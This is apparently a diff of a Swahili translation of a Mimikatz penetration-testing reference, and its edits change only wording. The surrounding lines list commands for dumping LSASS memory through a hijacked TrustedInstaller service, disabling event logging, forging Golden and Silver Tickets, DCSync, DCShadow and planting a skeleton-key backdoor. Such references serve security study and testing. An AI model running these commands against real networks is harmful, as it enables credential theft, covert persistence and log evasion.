@@ -30,7 +30,7 @@ Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua kubwa zimechukuli
 
 - **LM hashes na nywila za maandiko ya kawaida** hazihifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekwa na thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha kwamba nywila "za maandiko ya kawaida" hazihifadhiwi katika LSASS.
 
-- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindano ya msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato ulio na ulinzi. Kuanzisha Ulinzi wa LSA kunahusisha:
+- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindano ya msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato uliohifadhiwa. Kuanzisha Ulinzi wa LSA kunahusisha:
 1. Kubadilisha rejista katika _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
 2. Kutekeleza Kituo cha Sera ya Kundi (GPO) kinacholazimisha mabadiliko haya ya rejista katika vifaa vinavyosimamiwa.
 
@@ -38,7 +38,7 @@ Licha ya ulinzi huu, zana kama Mimikatz zinaweza kupita Ulinzi wa LSA kwa kutumi
 
 ### Kupambana na Kuondolewa kwa SeDebugPrivilege
 
-Wasimamizi kwa kawaida wana SeDebugPrivilege, ambayo inawawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia dump za kumbukumbu zisizoidhinishwa, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya dump za kumbukumbu kwa kutumia usanidi maalum wa huduma:
+Wasimamizi kwa kawaida wana SeDebugPrivilege, inayo wawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia matukio yasiyoidhinishwa ya kumbukumbu, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya matukio ya kumbukumbu kwa kutumia usanidi maalum wa huduma:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -61,7 +61,7 @@ Event log tampering in Mimikatz involves two primary actions: clearing event log
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- Amri hii ya majaribio imeundwa kubadilisha tabia ya Huduma ya Kumbukumbu za Matukio, kwa ufanisi kuzuia kurekodi matukio mapya.
+- Hii amri ya majaribio imeundwa kubadilisha tabia ya Huduma ya Kumbukumbu za Matukio, kwa ufanisi kuzuia kurekodi matukio mapya.
 - Mfano: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Amri ya `privilege::debug` inahakikisha kwamba Mimikatz inafanya kazi kwa ruhusa zinazohitajika kubadilisha huduma za mfumo.
@@ -76,10 +76,10 @@ A Golden Ticket allows for domain-wide access impersonation. Key command and par
 
 - Command: `kerberos::golden`
 - Parameters:
-- `/domain`: Jina la eneo.
-- `/sid`: Kitambulisho cha Usalama wa eneo (SID).
+- `/domain`: Jina la kikoa.
+- `/sid`: Kitambulisho cha Usalama wa kikoa (SID).
 - `/user`: Jina la mtumiaji wa kuiga.
-- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya eneo.
+- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya kikoa.
 - `/ptt`: Inachoma tiketi moja kwa moja kwenye kumbukumbu.
 - `/ticket`: Huhifadhi tiketi kwa matumizi ya baadaye.
 
@@ -89,12 +89,12 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 ```
 ### Silver Ticket Creation
 
-Silver Tickets hutoa ufikiaji kwa huduma maalum. Amri muhimu na vigezo:
+Silver Tickets hutoa ufikiaji kwa huduma maalum. Amri kuu na vigezo:
 
 - Amri: Inafanana na Golden Ticket lakini inalenga huduma maalum.
 - Vigezo:
 - `/service`: Huduma ya kulenga (mfano, cifs, http).
-- Vigezo vingine vinavyofanana na Golden Ticket.
+- Vigezo vingine vinashabihiana na Golden Ticket.
 
 Mfano:
 ```bash
@@ -121,7 +121,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **Pita kwenye Kache**:
 - Amri: `kerberos::ptc`
-- Inachanganya tiketi za Kerberos kutoka kwa faili za kache.
+- Inachanganya tiketi za Kerberos kutoka kwenye faili za kache.
 - Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pita Tiketi**:
@@ -137,7 +137,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Uingiliaji wa Active Directory
 
-- **DCShadow**: Fanya mashine kuwa DC kwa muda kwa ajili ya uhamasishaji wa kituo cha AD.
+- **DCShadow**: Fanya mashine ifanye kazi kama DC kwa ajili ya kubadilisha vitu vya AD.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
 - **DCSync**: Fanya kama DC ili kuomba data za nywila.
@@ -149,7 +149,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Fanya kama DC kwa kutumia data za nywila za akaunti ya kompyuta.
-- *Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa asili.*
+- *Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa awali.*
 
 - **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.
 - `mimikatz "lsadump::sam" exit`
@@ -165,7 +165,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Mambo Mbalimbali
 
-- **MISC::Skeleton**: Ingiza nyuma ya mlango kwenye LSASS kwenye DC.
+- **MISC::Skeleton**: Ingiza mlango wa nyuma kwenye LSASS kwenye DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Kuinua Haki
@@ -184,11 +184,11 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Toa tiketi za Kerberos kutoka kwenye kumbukumbu.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Uhamasishaji wa Sid na Token
+### Ubadilishaji wa Sid na Token
 
 - **SID::add/modify**: Badilisha SID na SIDHistory.
 - Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Badilisha: *Hakuna amri maalum ya kubadilisha katika muktadha wa asili.*
+- Badilisha: *Hakuna amri maalum ya kubadilisha katika muktadha wa awali.*
 
 - **TOKEN::Elevate**: Fanya kama token.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -199,7 +199,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: Orodhesha vikao vya TS/RDP.
-- *Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa asili.*
+- *Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa awali.*
 
 ### Vault
 
